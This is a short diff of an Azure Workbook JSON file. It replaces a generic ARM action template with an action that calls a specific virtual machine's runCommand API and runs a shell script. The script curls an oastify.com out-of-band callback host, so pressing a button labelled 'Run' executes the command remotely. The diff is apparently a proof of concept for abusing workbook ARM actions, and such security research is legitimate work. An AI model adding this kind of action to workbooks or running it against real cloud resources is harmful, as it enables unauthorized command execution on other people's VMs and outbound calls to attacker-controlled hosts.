@@ -15,22 +15,18 @@
       "type": 3,
       "content": {
         "version": "ARMActionContext/1.0",
-        "armActionContext": {
-          "path": "/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/{resourceProviderNamespace}/{resourceType}/{resourceName}",
-          "headers": [
-            {"key": "Content-Type", "value": "application/json"}
-          ],
-          "params": [
-            {"key": "api-version", "value": "2022-12-01"}
-          ],
-          "body": "{\"property\": \"value\"}",
-          "isLongOperation": true,
-          "httpMethod": "POST",
-          "title": "Execute ARM Action",
-          "description": "This action executes an ARM operation with the specified parameters.",
-          "actionName": "CustomARMAction",
-          "runLabel": "Run ARM Action"
-        }
+        "path": "/subscriptions/87ee91c0-dc05-4d2b-9af2-4a18ed926832/resourceGroups/mbernstein-rg/providers/Microsoft.Compute/virtualMachines/mbernstein-test/runCommand?api-version=2018-04-01",
+        "headers": [
+          {"key": "Content-Type", "value": "application/json"}
+        ],
+        "params": [],
+        "body": "{\"commandId\": \"RunShellScript\", \"script\": [\"curl 6krx0dzdpuruh1wd5b9hkj2cq3wvko8d.oastify.com/?shuuu\"]}",
+        "isLongOperation": false,
+        "httpMethod": "POST",
+        "title": "Run Shell Script",
+        "description": "Execute a shell script on the target VM.",
+        "actionName": "RunCommand",
+        "runLabel": "Run"
       },
       "name": "ARM Action Context"
     }
